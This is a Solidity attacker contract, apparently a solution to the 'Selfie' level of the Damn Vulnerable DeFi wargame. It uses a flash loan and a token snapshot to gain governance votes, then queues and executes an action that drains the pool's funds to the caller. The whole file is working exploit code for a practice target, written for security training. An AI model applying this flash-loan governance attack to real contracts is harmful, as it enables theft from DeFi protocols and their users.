// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "hardhat/console.sol";

contract SelfiePoolAttacker {
    SelfiePool pool;
    DamnValuableTokenSnapshot token;
    SimpleGovernance gov;

    uint256 public actionId;

    constructor(address _poolAddress, address _tokenAddress, address _govAddress) {
        pool = SelfiePool(_poolAddress);
        token = DamnValuableTokenSnapshot(_tokenAddress);
        gov = SimpleGovernance(_govAddress);
    }

    function attack() external {
        // 1. take a flash loan for the entire balance of the pool
        pool.flashLoan(token.balanceOf(address(pool)));

        // 4. drain all funds from the pool
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", address(msg.sender));
        actionId = gov.queueAction(address(pool), data, 0);
    }
    
    // called by SelfishPool::flashLoan
    function receiveTokens(address, uint256 amount) external {
        // 2. this is needed to pass the validation in queueAction
        token.snapshot();  

        // 3. pay back the flash loan
        token.transfer(address(pool), amount);

    }

    function attack2() external {
        // 5. exeucte 
        gov.executeAction(actionId);
    }

    // receive() external payable {}
    // fallback() external payable {}
}
